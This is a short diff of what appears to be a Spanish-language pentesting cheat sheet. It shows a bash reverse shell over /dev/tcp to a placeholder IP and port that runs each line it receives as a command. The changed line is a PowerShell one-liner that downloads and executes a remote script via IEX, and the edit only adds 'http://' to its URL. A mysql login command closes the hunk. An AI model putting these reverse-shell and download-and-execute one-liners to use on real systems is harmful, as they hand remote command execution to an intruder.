@@ -50,7 +50,7 @@ Reverse shell
     exec 5<>/dev/tcp/IP/PUERTO cat <&5 | while read line; do $line 2>&5 >&5; done&		(el & final la pone en background)
 
 	WINDOWS:
-		powershell "IEX (New-Object Net.WebClient).downloadString('IP:PUERTO/SHELL')"
+		powershell "IEX (New-Object Net.WebClient).downloadString('http://IP:PUERTO/SHELL')"
 
 Conectarse por mysql
 	mysql -uUSUARIO -pPASSWORD -h HOST
